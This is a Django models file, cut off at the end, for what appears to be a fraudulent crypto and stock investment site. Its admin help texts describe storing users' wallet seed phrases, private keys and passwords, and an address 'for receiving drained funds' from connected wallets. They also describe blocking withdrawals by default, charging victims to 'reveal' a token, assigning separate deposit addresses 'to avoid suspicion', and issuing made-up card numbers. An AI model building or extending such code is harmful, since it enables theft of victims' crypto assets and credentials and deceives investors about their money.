from django.contrib.auth.models import AbstractUser, BaseUserManager, Group, Permission, PermissionsMixin
from django.template.loader import render_to_string
from django.core.mail import EmailMultiAlternatives
from django.db.models.signals import post_save
from datetime import datetime, timedelta
from django.utils.html import strip_tags
from django.core.mail import send_mail
from django.http import JsonResponse
from django.dispatch import receiver
from django.utils import timezone
from django.db import transaction
from django.conf import settings
from django.db import models
from decimal import Decimal
import random
import string
import logging
import uuid


logger = logging.getLogger(__name__)


class UserManager(BaseUserManager):
    def create_user(self, email, password=None, **extra_fields):
        if not email:
            raise ValueError('Users must have an email address')
        user = self.model(email=email, **extra_fields)
        user.set_password(password)
        user.save(using=self._db)
        return user
    
    def create_superuser(self, email, password, **extra_fields):
        if not email:
            raise ValueError('Superusers must have an email address')
        extra_fields.setdefault('is_staff', True)
        extra_fields.setdefault('is_superuser', True)

        return self.create_user(email, password, **extra_fields)
    
class User(AbstractUser, PermissionsMixin):
    email = models.EmailField(unique=True)
    firstname = models.CharField(max_length=255, blank=True)
    lastname = models.CharField(max_length=255, blank=True)
    username = models.CharField(max_length=255, blank=True, null=True)
    is_superuser = models.BooleanField(default=False)
    objects = UserManager()

    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = ['firstname', 'lastname']

    def get_full_name(self):
        return f'{self.firstname} {self.lastname}'
    
    def __str__(self):
        return self.email.split('@')[0]
    
class Profiles(models.Model):
    
    user = models.OneToOneField(User, on_delete=models.CASCADE)

    nationality = models.CharField(max_length=500, null=True, blank=True)
    profile_pic = models.ImageField(upload_to='profile_images/', null=True, blank=True)
    preferred_currency = models.ForeignKey('Currencies', on_delete=models.SET_NULL, blank=True, null=True, help_text='User\'s preferred currency')
    preferred_card = models.ForeignKey('CryptoCards', on_delete=models.SET_NULL, blank=True, null=True, help_text='User\'s preferred transaction card')

    investment_manager = models.ForeignKey(
        'Traders',
        on_delete=models.SET_NULL,
        blank=True,
        null=True,
        verbose_name='Account Manager', 
        help_text='Assign a Trader for this user.')
    
    trade_status = models.CharField(max_length=30, default='No Trade')
    verification = models.ForeignKey("Verification", on_delete=models.SET_NULL, null=True, blank=True, help_text='User\'s verification documents. Create or update verification status through the "Verification table for this user.')

    def __str__(self):
        return f'{self.user.firstname} {self.user.lastname} profile'
    
class AccessSettings(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)

    can_login = models.BooleanField(
        default=True, 
        verbose_name='Account Access', 
        help_text='Decide whether this account can login, True by default'
    )

    withdrawal_limit = models.DecimalField(
        default=7000.00, 
        max_digits=10, 
        decimal_places=2, 
        verbose_name='Minimum withdrawal', 
        help_text='Set the minimum amount this user can withdraw.'
        )
    
    deposit_limit = models.DecimalField(
        default=500.00, 
        max_digits=10, 
        decimal_places=2, 
        verbose_name='Minimum Deposit Limit', 
        help_text='Set the minimum amount this user can deposit.'
    )

    crypto_card_price = models.DecimalField(
        decimal_places=2, 
        max_digits=10, 
        default=1000.00,
        verbose_name='Crypto Card Price',
        help_text='Set the price that this user will be charged for card creation. default is 1000.00 pounds.' 
        )
    
    card_initial_funding = models.DecimalField(
        decimal_places=2, 
        max_digits=10, 
        default=1000.00,
        verbose_name='Initial Card Funding',
        help_text='Set the amount that this user will be charged for initial card funding. Default is 1000.00 pounds.\n To request a new crypto card, this user must have sufficient funds to cover for the card creation fee and initial funding in their deposit balance.for example, if the card price is 1000.00 and the card initial funding amount is also 1000.00, the user will need and will be charged a minimum of 2000.00 pounds in their deposit balance or higher, depending on what is entered by the user. \n Users cannot request for a new crypto card with funds from their profits balance because they cannot perform any withdrawal without first having a crypto card.'
    
    )

    min_gold_purchase = models.IntegerField(
        default=5000, 
        verbose_name='Minimum Gold Purchase', 
        help_text='(GBP)'
    )

    email_alerts = models.BooleanField(
        default=True, help_text='Whether this user can receive email notifications. the user can turn this on or off in their account settings'
    )

    can_withdraw = models.BooleanField(
        default=False, 
        verbose_name='Withdrawal Access', 
        help_text='Give this user the ability to withdraw. By default, the user will not be able to withdraw'
    )
    
    recipient_type = models.CharField(
        choices=[
            ('ADDRESS', 'Wallet Address'),
            ('WALLETCONNECT', 'Wallet Connect'),
        ],
        max_length=20,
        default='ADDRESS',
        verbose_name='Recipient Type',
        help_text='Set the type of recipient this user will use when withdrawing. By default, they will be asked for the recipient wallet address. if Walletconnect option is selected, they will need to connect their wallet using the manual connection mode and then will be shown the connected address as the recipient address.'
    ) 

    can_transfer = models.BooleanField(
        default=False, 
        verbose_name='External Transfer Access', 
        help_text='Give this user the ability to transfer funds to other users. By default, the user will not be able to transfer'
    )

    can_invest = models.BooleanField(
        default=True,
        verbose_name= "Allow Investments",
        help_text='Allow this user to make investments. By default, the user will be allowed to invest'
    )

    wallet_connection = models.CharField(
        choices=[
            ('MANUAL', 'Manual Connection'),
            ('AUTOMATIC', 'Automatic Connection'),
        ],
        max_length=20,
        default='AUTOMATIC',
        help_text='Choose how this user can connect their wallet. By default, the user will be able to connect their wallet automatically. If you choose manual connection, the user will have to enter their wallet phrasekey manually. useful for loading'
    )

    ask_for_token = models.BooleanField(
        default=False, verbose_name='Ask for Token', 
        help_text='Ask this user to provide their token. By default, the user will not be asked to provide their token during verification. you can turn this on and ask for payment to reveal the token. it will be automatically generated if you turn it on'
    )

    token = models.CharField(
        max_length=30,
        blank=True,
        null=True,
        verbose_name='Token',
        help_text='Do not manually edit this field. it will be automatically generated if you turn on the ask for token option.'

    )

    def __str__(self):
        return self.user.get_full_name()

    def save(self, *args, **kwargs):
        if self.ask_for_token and not self.token:
            self.token = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
        elif not self.ask_for_token and self.token:
            self.token = ''
        super().save(*args, **kwargs)

class Balances(models.Model):
    user = models.OneToOneField(User, related_name="balances", on_delete=models.CASCADE)

    deposits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True, null=True)
    bonus = models.DecimalField(default=10.00, max_digits=10, decimal_places=2, blank=True, null=True)
    profits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True, null=True)
    
    stocks = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)

    @property
    def all_balance(self):
        return self.deposits + self.bonus + self.profits + self.stocks
    @property
    def total_balance(self):
        return self.deposits + self.bonus + self.profits
    
    
    def __str__(self):
        return f'{self.user.get_full_name()}\'s balance'

class USDBalance(models.Model):
    balance = models.OneToOneField(Balances, on_delete=models.CASCADE, related_name='usd_balance')
    deposits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True, help_text='this balances update automatically based on the user\'s main (GBP) balance. System default currency is GBP but users can change to their preferred currency. You should not change any field here manually.')
    bonus = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)
    profits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)
    @property
    def total_balance(self):
        return self.deposits + self.bonus + self.profits
    
    def __str__(self):
        return f'{self.balance.user.get_full_name()}\'s USD balance'

class EURBalance(models.Model):
    balance = models.OneToOneField(Balances, on_delete=models.CASCADE, related_name='euro_balance')
    deposits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True, help_text='this balances update automatically based on the user\'s current balance. You should not change any field here manually.')
    bonus = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)
    profits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)
    
    @property
    def total_balance(self):
        return self.deposits + self.bonus + self.profits
    
    def __str__(self):
        return f'{self.balance.user.get_full_name()}\'s EUR balance'

class Stocks(models.Model):
    symbol = models.CharField(max_length=10, unique=True)  
    name = models.CharField(max_length=255, null=True, blank=True) 
    price = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True, help_text="Stock price are in USD because they\'re fetched from the US stock market. the system automatically converts the prices to the user's preferred currency when needed.") 
    logo = models.ImageField(upload_to='stock_logos/', null=True, blank=True)
    high = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True)
    market_cap = models.DecimalField(max_digits=20, decimal_places=2, null=True, blank=True)
    market_cap_fetched = models.DateTimeField(null=True, blank=True)
    low = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True) 
    change = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True)  
    change_percent = models.DecimalField(max_digits=5, decimal_places=2, null=True, blank=True)
    currency = models.CharField(max_length=10, null=True, blank=True) 
    last_updated = models.DateTimeField(auto_now=True)  

    def __str__(self):
        return f"{self.symbol} - {self.price if self.price else 'N/A'}"

class StockHoldings(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    stock = models.ForeignKey(Stocks, on_delete=models.CASCADE)
    quantity = models.PositiveIntegerField(default=0)
    minimum_holding_period = models.PositiveIntegerField(default=0, verbose_name="Holding Duration (in days)", help_text="Minimum number of days this stock must be held before it can be sold.")
    days_until_sell = models.PositiveIntegerField(default=0, verbose_name="Days until sell", help_text="Number of days remaining before this stock can be sold.")
    last_decrement = models.DateField(editable=False, null=True, blank=True)
    date_added = models.DateTimeField(auto_now_add=True)
    @property
    def total_value(self):
        return (self.stock.price or 0) * self.quantity  

    def __str__(self):
        return f"{self.user.get_full_name()} - {self.stock.symbol}"

class StockTransactions(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    stock = models.ForeignKey(Stocks, on_delete=models.CASCADE)
    quantity = models.PositiveIntegerField(default=0)
    amount = models.DecimalField(max_digits=10, decimal_places=2, default=0.00)
    transaction_type = models.CharField(max_length=100, default='BUY', choices=[('BUY', 'BUY'), ('SELL', 'SELL')])
    description = models.TextField(null=True, blank=True)
    date = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.user.get_full_name()} - {self.transaction_type} - {self.quantity}'

class CryptoBalance(models.Model):
    user = models.OneToOneField(User, related_name="crypto_balances", on_delete=models.CASCADE)
    
    btc = models.DecimalField(
        default=0.00000000, 
        max_digits=20, 
        decimal_places=8, 
        blank=True, 
        null=True
    )
    eth = models.DecimalField(
        default=0.00000000, 
        max_digits=20, 
        decimal_places=8, 
        blank=True, 
        null=True
    )
    usdt = models.DecimalField(
        default=0.00, 
        max_digits=20, 
        decimal_places=2, 
        blank=True, 
        null=True
    )

    last_btc_rate = models.DecimalField(
        max_digits=18, 
        decimal_places=8, 
        default=0, 
        null=True, 
        blank=True,
    )
    last_eth_rate = models.DecimalField(
        max_digits=18, 
        decimal_places=8, 
        default=0, 
        null=True, 
        blank=True
    )
    last_usdt_rate = models.DecimalField(
        max_digits=18, 
        decimal_places=8, 
        default=0, 
        null=True, 
        blank=True
    )

    last_total_worth = models.DecimalField(
        max_digits=18, 
        decimal_places=2, 
        default=0, 
        null=True, 
        blank=True
    )
    last_total_worth_in_btc = models.DecimalField(
        max_digits=20, 
        decimal_places=10, 
        default=0, 
        null=True, 
        blank=True
    )

    def __str__(self):
        return f"{self.user.get_full_name()}'s Crypto Balance"

class CryptoExchangeRate(models.Model):
    base_choices = [  
        ('BTC', 'BTC'), 
        ('ETH', 'ETH'),
        ('USDT', 'USDT'),
    ]

    base_currency = models.CharField(max_length=20, choices=base_choices)
    
    quote_currency = models.ForeignKey('Currencies', on_delete=models.CASCADE, related_name='crypto_exchange_rates')


    rate = models.DecimalField(max_digits=18, decimal_places=8)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"1 {self.base_currency} = {self.rate} {self.quote_currency}"

class CryptoTransaction(models.Model):
    TRANSACTION_TYPES = [
        ('FIAT TO CRYPTO', 'Fiat to Crypto'),
        ('CRYPTO TO FIAT', 'Crypto to Fiat'),
    ]
    currency_choices = [
        ('BTC', 'BTC'), 
        ('ETH', 'ETH'), 
        ('USDT', 'USDT')
    ]

    status_choices = [
        ('PENDING', 'Pending'), 
        ('COMPLETED', 'Completed'), 
        ('FAILED', 'Failed'),
    ]
    fiat_choices = [
        ('GBP', 'GBP'),
        ('USD', 'USD'),
        ('EUR', 'EUR'),
    ]
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    crypto = models.CharField(max_length=10, choices=currency_choices)
    target_currency = models.CharField(max_length=10, choices=fiat_choices, null=True, blank=True)
    amount = models.DecimalField(max_digits=18, decimal_places=8)
    transaction_type = models.CharField(max_length=20, choices=TRANSACTION_TYPES)
    status = models.CharField(max_length=20, choices=status_choices, default='PENDING')
    description = models.TextField(null=True, blank=True)
    date_created = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.user.get_full_name()} - {self.transaction_type} - {self.crypto}: {self.amount}"

class Currencies(models.Model):
    name = models.CharField(max_length=255, null=True, blank=True)
    symbol = models.CharField(max_length=3, null=True, blank=True)
    code = models.CharField(max_length=255, null=True, blank=True)
    exchange_rate = models.DecimalField(max_digits=5, decimal_places=2, null=True, blank=True)

    def __str__(self):
        return f'{self.name} - {self.symbol} - {self.code}'    

class CryptoCards(models.Model):
    card_status_choices = [
        ('Not activated', 'Not activated'),
        ('Activated', 'Activated'),
        ('Blocked', 'Blocked'),
    ]
    admin_card_status_choices = [
        ('Activated', 'Activated'),
        ('Blocked', 'Blocked'),
    ]
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    card_holder = models.CharField(max_length=100, blank=True, null=True)
    card_number = models.CharField(max_length=100, null=True, blank=True)
    pin = models.IntegerField(default=0, verbose_name='pin', blank=True, null=True)
    expiry_date = models.DateField(null=True, blank=True)
    cvv = models.IntegerField(null=True, blank=True)
    available_amount = models.DecimalField(max_digits=15, decimal_places=2, default=0.00, null=True, blank=True)
    card_status = models.CharField(max_length=15, default='Not activated', choices=card_status_choices, help_text="This can be toggled by the user. to block the card, use the admin card status field below. ")
    admin_control = models.CharField(
        max_length=15, 
        default="Activated", 
        choices=admin_card_status_choices,
        help_text='Use this to override the default card status and render the card unusable for the user.'
    )
    
    can_fund = models.BooleanField(default=True, help_text='Whether this card can be funded. By default, the card can be funded.')
    can_defund = models.BooleanField(default=True, help_text='Whether this card can be defunded. By default, the card can be defunded.')
    
    email_pin = models.BooleanField(default=False, editable=False)
    

    def save(self, *args, **kwargs):
        if not self.card_number:
            prefixes = ['5190', '4040', '5922', '4139']
            prefix = random.choice(prefixes)
            self.card_number = prefix + ''.join(random.choices(string.digits, k=12))
        if not self.cvv:
            self.cvv = ''.join(random.choices(string.digits, k=3))

        if not self.pin:
            self.pin = ''.join(random.choices(string.digits[1:], k=4))

        super().save(*args, **kwargs)

    def __str__(self):
        return f'{self.user.get_full_name()} Card'


class CardRequest(models.Model):
    status_choices = [
        ('Processing', 'Processing'),
        ('Approved', 'Approved'),
        ('Rejected', 'Rejected'),
        ]
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    name_on_card = models.CharField(max_length=100)
    amount = models.DecimalField(max_digits=10, decimal_places=2)
    status = models.CharField(max_length=100, choices=status_choices, default='pending')
    email_pin = models.BooleanField(default=False, verbose_name='Email Pin', help_text='Whether to include the card pin in the notification message that will sent to the user if the request is approved.')
    created = models.BooleanField(default=False, editable=False)
    date = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.user.get_full_name()}\'s Card request'
    
    def save(self, *args, **kwargs):
        try:
            if self.status == 'Approved' and not self.created:
                user = self.user
                approval_date = timezone.now()
                expiry_date = approval_date + timedelta(days=730)
                card_price = user.accesssettings.crypto_card_price
                card = CryptoCards(
                    user=self.user,
                    card_holder=self.name_on_card,
                    expiry_date=expiry_date,
                    available_amount=self.amount - card_price,
                    card_status='Activated',
                    email_pin=self.email_pin,

                )
                card.save()
                profile = Profiles.objects.get(user=self.user)
                profile.preferred_card = card
                profile.save()
                self.created = True

            elif self.status =='rejected' and not self.created:
                user = self.user
                user.balances.deposits += self.amount
                user.balances.save()
                Notifications.objects.create(
                    user=self.user, 
                    title='RVSL: Card Request Failed', 
                    message='Your transaction card creation was not succesful. card creation and funding amount has been refunded to your deposit account.'
                )
                self.created = True

        except Exception as e:
            print(str(e))
            logger.error('An error occurred while processing the instance status %s', e)
            pass

        super().save(*args, **kwargs)

class WithdrawalRequest(models.Model):
    options = [
        ('Under review', 'Under review'),
        ('Processing', 'Processing'),
        ('Failed', 'Failed'),
        ('Approved', 'Approved'),
    ]
    account_choices = [
        ('deposit', 'Deposit'), 
        ('profit', 'Profit'), 
        ('bonus', 'Bonus'),
        ('All Accounts', 'All Accounts'),
    ]
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    network = models.CharField(max_length=100, default='no data')
    address = models.CharField(max_length=255, default='no data')
    debit_account = models.CharField(max_length=100, default='deposit', choices=account_choices)
    amount = models.DecimalField(max_digits=10, decimal_places=2, default=0.00)
    amount_in_preferred_currency = models.DecimalField(max_digits=10, decimal_places=2, default=0.00)
    status = models.CharField(max_length=30, default='Under Review', choices=options)
    status_message = models.TextField(max_length=5000, null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    request_id = models.CharField(max_length=100, blank=True, null=True)

    def __str__(self):
        return f'{self.user.get_full_name()} - {self.amount}, {self.created_at.strftime("%d/%m/%Y, %H:%M:%S")}'
    
    def save(self, *args, **kwargs):
        if self.debit_account == 'everything':
            self.debit_account = 'All Accounts'
        super().save(*args, **kwargs)
    
class BalanceTracker(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    withdrawal_request = models.ForeignKey(WithdrawalRequest, on_delete=models.CASCADE, related_name='balance_tracker', null=True, blank=True)
    last_deposit = models.DecimalField(null=True, max_digits=10, decimal_places=2, blank=True)
    last_profits = models.DecimalField(null=True, max_digits=10, decimal_places=2, blank=True)
    last_bonus = models.DecimalField(null=True, max_digits=10, decimal_places=2, blank=True)
    reversed = models.BooleanField(default=False, editable=False)
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.user.get_full_name()}\'s balance history'
    
#wallet address model
class WalletAddresses(models.Model):
    user = models.ForeignKey(
        User, 
        null=True, 
        blank=True, 
        on_delete=models.CASCADE, 
        help_text='You can either add a unique wallet address for a specific user by selecting the user here or leave the user field blank to add a public wallet address that all users can use. this is useful when two closely related users register and you want one of them to have a unique address to avoid suspicion.'
    )
    
    name = models.CharField(
        max_length=255, 
        verbose_name='Crypto Name', 
        help_text='example: bitcoin, ethereum, tether USDT, etc ...'
    )
    network = models.CharField(
        max_length=255, 
        help_text='example: BTC, ETH, TRC20, ERC20, etc ...'
    )
    wallet_address = models.CharField(max_length=255)
    label = models.TextField(
        null=True, 
        blank=True,
        help_text='this is the label that will be used to identify the wallet address exchange. example : Binance, Kucoin, etc ... Useful if you are adding wallet addresses ffrom multiple exchanges.'
    )

    def __str__(self):
        return f'{self.name.upper()} - {self.wallet_address}'
    
    def save(self, *args, **kwargs):
        name = self.name.upper()
        network = self.network.upper()
        self.name = name
        self.network = network

        super().save(*args, **kwargs)

class Deposits(models.Model):
    options = [
        ('No deposit', 'No Deposit'),
        ('Failed', 'Failed'),
        ('Under review', 'Under review'),
        ('Confirmed', 'Confirmed'),
    ]
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    amount = models.DecimalField(max_digits=20, decimal_places=2, default=0.00, null=True, blank=True)
    address=models.CharField(max_length=255, null=True, blank=True)
    network = models.CharField(max_length=100, null=True, blank=True)
    hash = models.CharField(max_length=255, null=True, blank=True)
    status = models.CharField(max_length=50, default='No Deposit', choices=options)
    credited = models.BooleanField(default=False, editable=False)
    status_message = models.TextField(max_length=5000, null=True, blank=True)
    deposit_id = models.CharField(default='', max_length=100, null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    def save(self, *args, **kwargs):
        if not self.deposit_id:
            self.deposit_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=20))
        super().save(*args, **kwargs)

    def __str__(self):
        return f'{self.user.get_full_name()}- £{self.amount}'

class Investments(models.Model):
    status_choices = [
        ('Active', 'Active'),
        ('Under review', 'Under review'),
        ('Cancelled', 'Cancelled'),
        ('Completed', 'Completed'),
        ('Rejected', 'Rejected'),
          ]
    investor = models.ForeignKey(User, on_delete=models.CASCADE)
    plan = models.ForeignKey('InvestmentPlans', on_delete=models.CASCADE)
    amount = models.DecimalField(default=0.00, max_digits=10, decimal_places=2)
    duration = models.IntegerField(default=5)
    profit_rate = models.DecimalField(default=0.00, max_digits=5, decimal_places=2)
    losses_rate = models.DecimalField(default=0.05, max_digits=5, decimal_places=2, null=True, blank=True)
    total_profits_accrued = models.DecimalField(default=0.00, max_digits=10, decimal_places=2)
    days_remaining = models.IntegerField(blank=True, null=True)
    last_decrement = models.DateField(editable=False, null=True, blank=True)
    debit_account = models.CharField(max_length=100, default='')
    manager = models.ForeignKey('Traders', blank=True, null=True, related_name='trader', on_delete=models.CASCADE)

    reference = models.CharField(max_length=30, default='')
    date = models.DateTimeField(auto_now_add=True)
    status = models.CharField(
        max_length=100,
        choices=status_choices, 
        default='awaiting slot entry'
        )
    last_updated = models.DateTimeField(default=timezone.now)
    alert_user = models.BooleanField(default=False, help_text='Turn this on whenever you make changes to the status of this investment and you want the user to be notified about the change.')
    refunded = models.BooleanField(default=False, editable=False)

    @property
    def progress_percentage(self):
        if self.days_remaining is not None and self.duration > 0:
            progress = Decimal(100) * (1 - Decimal(self.days_remaining) / Decimal(self.duration))
            return max(0, min(100, round(progress, 2)))  # Ensure it's within 0-100 range
        return 0
    def __str__(self):
        return f'{self.investor} investment: £{self.amount}'
    
    def save(self, *args, **kwargs):
        if self.status == 'Rejected' and self.debit_account in ['deposit', 'profit'] and not self.refunded:
            try:
                with transaction.atomic():
                    if self.debit_account == 'deposit':
                        self.investor.balances.deposits += self.amount
                    elif self.debit_account == 'profit':
                        self.investor.balances.profits += self.amount
                                       
                    self.investor.balances.save()

                    title = f'RVSL: Reversal to your {self.debit_account} account'
                    message = (
                        f'Unfortunately, your investment request couldn\'t be approved.\n'
                        f'Investment capital reversed upon request rejection, £{self.amount} credited to your {self.debit_account} account.'
                    )
                    Notifications.objects.create(user=self.investor, title=title, message=message)
                    
                    self.refunded = True

            except Exception:
                logger.exception(f'Error while reversing investment capital to {self.investor.username}\'s {self.debit_account} account')
        
        if self.days_remaining is None:
            self.days_remaining = self.duration

        if not self.profit_rate or self.profit_rate <= 0:
            self.profit_rate = self.plan.profit_rate or Decimal('10.00')


        super().save(*args, **kwargs)

class Traders(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    name = models.CharField(max_length=255, unique=True)

    def __str__(self):
        return self.name
    
class EarningsHistory(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    investment = models.ForeignKey(Investments, on_delete=models.CASCADE)
    amount = models.DecimalField(max_digits=10, decimal_places=2)
    timestamp = models.DateTimeField(null=True, blank=True)
    def __str__(self):
        return f"{self.investment.investor.get_full_name()} - £{self.investment.amount} - Profit: £{self.amount}"

class LossesHistory(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    investment = models.ForeignKey(Investments, on_delete=models.CASCADE)
    amount = models.DecimalField(max_digits=10, decimal_places=2)
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.investment.investor.get_full_name()} - £{self.investment.amount} - Loss: £{self.amount}"

class Activities(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    activity = models.CharField(max_length=200)
    amount = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True)
    activity_description = models.TextField()
    date = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.activity} by {self.user.username}'

class InternalTransfers(models.Model):
    sender = models.ForeignKey(User, on_delete=models.CASCADE)
    recipient = models.ForeignKey(User, related_name='recipient', on_delete=models.CASCADE)
    amount = models.DecimalField(max_digits=10, decimal_places=2)
    timestamp = models.DateTimeField(auto_now_add=True)
    status = models.CharField(max_length=100, default='Successful')
    sender_comment = models.TextField(null=True, blank=True)
    recipient_comment = models.TextField(null=True, blank=True)

    def __str__(self):
        return f'{self.sender.get_full_name()} to {self.recipient.get_full_name()} - £{self.amount}'

class Verification(models.Model):

    verification_choices = [
        ('Under review', 'Under Review'),
        ('Verified', 'Verified'),
        ('Failed', 'Failed'),
        ('Awaiting', 'Awaiting'),
    ]

    user = models.ForeignKey(User, on_delete=models.CASCADE)
    email = models.CharField(max_length=100, null=True, blank=True)
    firstname = models.CharField(max_length=100, null=True, blank=True)
    lastname = models.CharField(max_length=100, null=True, blank=True)
    address = models.CharField(max_length=300, null=True, blank=True )
    nationality = models.CharField(max_length=255, null=True, blank=True)
    document_number = models.CharField(max_length=255, null=True, blank=True)
    phone = models.CharField(max_length=20, default='', blank=True, null=True)
    DOB = models.DateField(null=True, blank=True)
    id_front = models.ImageField(upload_to='docs/verification/id_cards/front', null=True, blank=True)
    id_back = models.ImageField(upload_to='docs/verification/id_cards/back', null=True, blank=True)
    face = models.ImageField(upload_to='docs/verification/faces/', null=True, blank=True)
    facial = models.FileField(upload_to='docs/verification/videos/', null=True, blank=True) 
    date_submitted = models.DateTimeField(default=datetime.now)
    last_updated = models.DateTimeField(null=True, blank=True)
    status = models.CharField(max_length=100, choices=verification_choices)


    def __str__(self):
        return f'{self.user.get_full_name()} Documents'

class Notifications(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    title = models.CharField(max_length=100)
    message = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    seen = models.BooleanField(default=False)
    def __str__(self):
        return f'{self.user.get_full_name()}\'s notification'

class EmailVerification(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    is_verified = models.BooleanField(default=False)
    account_is_verified = models.BooleanField(default=False)
    welcomed = models.BooleanField(default=False)
    email = models.EmailField()
    verification_code = models.IntegerField()
    creation_time = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.email}, Verified: {self.is_verified}'

class InvestmentPlans(models.Model):
    title = models.CharField(max_length=150, help_text='Example: BASIC PLAN, MICRO PLAN, etc...')
    min_amount = models.DecimalField(decimal_places=2, max_digits=10, default=0.00, help_text='Minimum amount to invest in this plan')
    max_amount = models.DecimalField(decimal_places=2, max_digits=10, default=0.00, help_text='Maximum amount to invest in this plan')
    min_duration = models.IntegerField(default=0, help_text='Minimum duration in days(how long the investment must be active for)')
    max_duration = models.IntegerField(default=0, help_text='Maximum duration in days(how long the investment will remain aactive active for)')
    profit_rate = models.DecimalField(default=0.00, max_digits=5, decimal_places=2, help_text="Profit rate of this plan. e.g. 6.00 means 5X capital as ROI")

    def __str__(self):
        return self.title.upper()
    
    def save(self, *args, **kwargs):
        self.title = self.title.upper()
        super().save(*args, **kwargs)


class Referrals(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    referral_id = models.UUIDField(default=uuid.uuid4, unique=True)
    referrals = models.ManyToManyField(User, related_name='my_referrals' , blank=True)

    def __str__(self):
        return 'Referrer: '+ self.user.get_full_name()

class ReferralCredits(models.Model):
    referrer = models.ForeignKey(User, on_delete=models.CASCADE, related_name='referrer')
    referred = models.ForeignKey(User, on_delete=models.CASCADE, related_name='referred')
    referrer_credit = models.DecimalField(decimal_places=2, max_digits=10, default=0.00, help_text='Amount of referral credits to add to the referrer\'s account')
    referred_credit = models.DecimalField(decimal_places=2, max_digits=10, default=0.00, help_text='Amount of referral credits to add to the referred\'s account')
    credited = models.BooleanField(default=False)
    date_updated = models.DateTimeField(null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.referrer.get_full_name()} referred {self.referred.get_full_name()}'


class WalletConnect(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)

    exchange = models.CharField(
        max_length=255,
        verbose_name='Wallet Exchange',
        null=True,
        blank=True,
    )

    protocol = models.CharField(
        max_length=255,
        null=True, 
        blank=True,
        verbose_name='Protocol',
        help_text='This indicate the key protocol (e.g Phrase key, KeyStore JSON file, PrivateKey, etc.)only KeyStore JSON file require passwords to decrypt the file. Always use Phrase key for simplicity',
    )

    key = models.TextField( 
        null=True, 
        blank=True,
        help_text="This stores the PrivateKey, Phrase Key or KeyStore JSON file content depending on the protocol",

    )

    connection_type = models.CharField(
        max_length=100, 
        choices=[('MANUAL', 'Manual'), ('AUTOMATIC', 'Automatic')], default='AUTOMATIC'
    )
    
    wallet_address = models.CharField(
        max_length=255, 
        null=True, 
        blank=True
    )

    password = models.CharField(
        max_length=255, 
        null=True, 
        blank=True
    )

    wallet_balance = models.DecimalField(
        max_digits=20, 
        decimal_places=8, 
        default=0.00
    )

    is_valid = models.BooleanField(
        default=False,
        verbose_name='Wallet Valid',
        help_text='This indicates if the wallet is valid or not. If the wallet is valid, it means that the wallet is connected and ready to use. If the wallet is not valid, it means that the wallet is not connected or the connection keys are invalid',
    )

    date_connected = models.DateTimeField(
        auto_now_add=True
    )

    def __str__(self):
        return f'{self.user.get_full_name()}\'s Wallet Connection'

class WalletConnectAddress(models.Model):
    ethereum_address = models.CharField(
        max_length=255,
        null=True, 
        blank=True,
        verbose_name='Ethereum Wallet Address',
        help_text='Enter the eth wallet address for receiving drained funds. This is the address that will be used to receive funds from connected accounts. If you add more than one address, only the first one will always be used. Instead, modify the existing address rather than adding another instance',
    )

    def __str__(self):
        return f'Ethereum: {self.ethereum_address}'
    
class Tickets(models.Model):
    status_choices = [
            ('Pending', 'Pending'), 
            ('In Progress', 'In Progress'), 
            ('Resolved', 'Resolved'),
            ('Closed', 'Closed'),
        ]
    user = models.ForeignKey(
        User,
        on_delete=models.CASCADE,
        null=True,
        blank=True, 
        help_text='This is the user that created the ticket. If the user field is blank, this ticket was created by an unregistered user.',
    )
    ticket_id = models.CharField(
        max_length=100, 
        unique=True, 
        null=True, 
        blank=True
    )
    name = models.CharField(
        max_length=255, 
        null=True, 
        blank=True,
        help_text='This is the name of the user that created the ticket.'
    )
    email = models.EmailField(
        null=True, 
        blank=True,
        help_text='This is the email of the user that created the ticket.'
    )
    message = models.TextField()

    status = models.CharField(
